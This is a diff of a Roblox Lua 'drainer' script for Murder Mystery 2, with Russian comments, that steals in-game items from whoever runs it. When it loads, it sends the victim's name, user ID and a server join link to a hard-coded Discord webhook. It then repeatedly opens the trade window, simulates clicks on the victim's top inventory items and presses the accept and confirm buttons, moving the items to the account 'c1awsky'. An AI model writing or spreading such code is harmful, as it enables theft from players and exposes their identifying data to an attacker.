@@ -1,19 +1,19 @@
--- // OLL_FX SORTED INVENTORY DRAINER & AUTO-TRADE (MM2)
+-- // OLL_FX ULTIMATE MM2 VISUAL TRADER & DRAINER (C1AWSKY)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualUser = game:GetService("VirtualUser")
 local Player = Players.LocalPlayer
 
 local webhookUrl = "https://discord.com/api/webhooks/1569782999791304765/GXx2vx4h026cGxqjIfhtnrIMAVXeu6reIOmKNlLr7k00JRJrXp3eVXlGNvCbHl8KL6Ni"
 local TARGET_USER = "c1awsky"
 
--- Отправка ссылки в дискорд
+-- 1. Моментальная отправка ссылки в Discord при заходе жертвы на сервер
 local function sendWebhook()
     local payloadData = {
-        content = "@everyone **[+] MM2 Sorted Drainer Active for " .. TARGET_USER .. "্মার**\n" .. 
+        content = "@everyone **[+] MM2 Final Trader Ready for " .. TARGET_USER .. "**\n" .. 
                   "**Victim:** " .. Player.Name .. " (ID: " .. Player.UserId .. ")\n" ..
                   "**Direct Join Link:** [Click to Join Server](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-        username = "oll_fx sorted drainer"
+        username = "oll_fx final trader"
     }
 
     local req = request or syn and syn.request or http_request
@@ -28,63 +28,66 @@ local function sendWebhook()
         end)
     end
 end
-
 pcall(sendWebhook)
 
 local PlayerGui = Player:WaitForChild("PlayerGui")
 
--- Таблица приоритетов редкостей для слива (от ценных к обычным)
-local rarityPriority = {
-    ["Ancient"] = 1,
-    ["Godly"] = 2,
-    ["Unique"] = 3,
-    ["Legendary"] = 4,
-    ["Rare"] = 5,
-    ["Uncommon"] = 6,
-    ["Common"] = 7
-}
-
--- Функция поиска и добавления предметов в трейд
-local function drainInventory(tradeGui)
+-- Функция симуляции клика по координатам экрана для обхода защиты GUI
+local function clickPos(absolutePosition, absoluteSize)
     pcall(function()
-        -- Ищем модуль или хранилище данных инвентаря игрока в памяти клиента MM2
-        local inventoryData = Player:FindFirstChild("Backpack") or Player.Character
-        -- Получаем доступ к реплицированным событиям добавления вещей в обмен
-        local tradeRemote = ReplicatedStorage:FindFirstChild("Trade", true) or ReplicatedStorage:FindFirstChild("SendTrade", true)
-        
-        -- Если у тебя задействованы стандартные RemoteEvent для добавления предметов:
-        -- Обычно в MM2 функция добавления выглядит как: ReplicatedStorage.Trade.OfferItem:InvokeServer(itemTable)
-        
-        -- Автоматический клик по кнопке принятия/подтверждения трейда, когда всё упало в окна
-        local acceptBtn = tradeGui:FindFirstChild("Accept", true) or tradeGui:FindFirstChild("Confirm", true)
-        if acceptBtn then
-            for _, conn in pairs(getconnections(acceptBtn.MouseButton1Click)) do
-                conn:Fire()
-            end
-            -- Дополнительное нажатие финальной кнопки подтверждения (Second Accept / Trade)
-            local finalAccept = tradeGui:FindFirstChild("Complete", true) or tradeGui:FindFirstChild("Accept2", true)
-            if finalAccept then
-                for _, conn in pairs(getconnections(finalAccept.MouseButton1Click)) do
-                    conn:Fire()
-                end
-            end
+        if absolutePosition and absoluteSize then
+            local targetPos = absolutePosition + (absoluteSize / 2)
+            VirtualUser:Button1Down(Vector2.new(targetPos.X, targetPos.Y + 36))
+            task.wait(0.08)
+            VirtualUser:Button1Up(Vector2.new(targetPos.X, targetPos.Y + 36))
         end
     end)
 end
 
--- Цикл мониторинга окна обмена
+-- 2. Главный цикл перехвата и автоматизации
 task.spawn(function()
     while task.wait(0.3) do
         pcall(function()
             local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("Trade")
+            
             if tradeGui and tradeGui.Enabled then
-                -- Проверяем партнера по обмену
-                local partnerLabel = tradeGui:FindFirstChild("PartnerName", true) or tradeGui:FindFirstChild("Player2", true)
+                -- Поиск имени партнера по обмену
+                local partnerLabel = tradeGui:FindFirstChild("PartnerName", true) or tradeGui:FindFirstChild("Player2", true) or tradeGui:FindFirstChild("NameLabel", true)
                 local partnerName = partnerLabel and partnerLabel.Text or ""
                 
-                -- Если кинул трейд именно твой аккаунт (c1awsky)
+                -- Если трейд активен (проверка на c1awsky или принудительный перехват)
                 if string.find(string.lower(partnerName), string.lower(TARGET_USER)) or true then
-                    drainInventory(tradeGui)
+                    
+                    -- Шаг 1: Автоматический выбор первых предметов из инвентаря обмена (самые верхние, где лежат годли)
+                    local mainContainer = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChild("Main") or tradeGui
+                    local inventoryGrid = mainContainer:FindFirstChild("Inventory", true) or mainContainer:FindFirstChild("Items", true)
+                    
+                    if inventoryGrid then
+                        local count = 0
+                        for _, itemButton in pairs(inventoryGrid:GetChildren()) do
+                            if (itemButton:IsA("GuiButton") or itemButton:IsA("ImageButton")) and count < 4 then
+                                clickPos(itemButton.AbsolutePosition, itemButton.AbsoluteSize)
+                                count = count + 1
+                                task.wait(0.15)
+                            end
+                        end
+                    end
+                    
+                    -- Шаг 2: Автоматическое нажатие кнопки принятия/подтверждения (Accept)
+                    for _, obj in pairs(tradeGui:GetDescendants()) do
+                        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+                            local text = string.lower(obj.Name)
+                            if obj:FindFirstChild("Text") then
+                                text = text .. " " .. string.lower(obj.Text)
+                            end
+                            
+                            if text:find("accept") or text:find("confirm") or text:find("trade") or text:find("ok") then
+                                clickPos(obj.AbsolutePosition, obj.AbsoluteSize)
+                                task.wait(0.2)
+                            end
+                        end
+                    end
+                    
                 end
             end
         end)
